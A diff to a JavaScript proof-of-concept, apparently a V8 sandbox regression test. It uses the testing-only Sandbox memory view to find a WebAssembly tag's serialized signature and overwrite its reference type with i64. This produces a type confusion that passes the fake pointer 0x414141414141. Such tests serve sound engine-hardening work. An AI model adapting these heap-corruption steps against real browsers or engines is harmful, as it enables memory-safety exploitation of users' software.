@@ -12,7 +12,7 @@ const kSmiTagSize = 1;
 const kKindBits = 5;
 const kI64 = 2;
 const kRef = 0xa;
-
+const kWasmTagObjectSerializedSignatureOffset = 0xc;
 const cage_base = BigInt(Sandbox.base);
 let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
 function getPtr(obj) {
@@ -21,12 +21,15 @@ function getPtr(obj) {
 function getField(obj, offset) {
   return memory.getUint32(obj + offset - kHeapObjectTag, true);
 }
+function setField(obj, offset, value) {
+  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
+}
 
 // find ByteArrayMap dynamically
 let dummy_tag = new WebAssembly.Tag({parameters: ['i64'], returns: []});
-let dummy_sig_ptr = Sandbox.readObjectField(dummy_tag, 'tag');
-let ByteArrayMap = getField(dummy_sig_ptr, 0);
 let dummy_tag_ptr = getPtr(dummy_tag);
+let dummy_sig_ptr = getField(dummy_tag_ptr, kWasmTagObjectSerializedSignatureOffset);
+let ByteArrayMap = getField(dummy_sig_ptr, 0);
 
 function fn(ptr, val) {
   return [val, ptr];
@@ -67,7 +70,6 @@ let needle = [
 // Find the serialized signature, starting at the dummy Tag object (allocated
 // before the serialized sig).
 let serialized_sig_ptr = findObject(needle, dummy_tag_ptr);
-Sandbox.corruptObjectField(
-    Sandbox.getObjectAt(serialized_sig_ptr), 0xc /* offset of ref */, kI64);
+setField(serialized_sig_ptr, 0xc /* offset of ref */, kI64);
 
 boom(0x414141414141n, 0x42n);
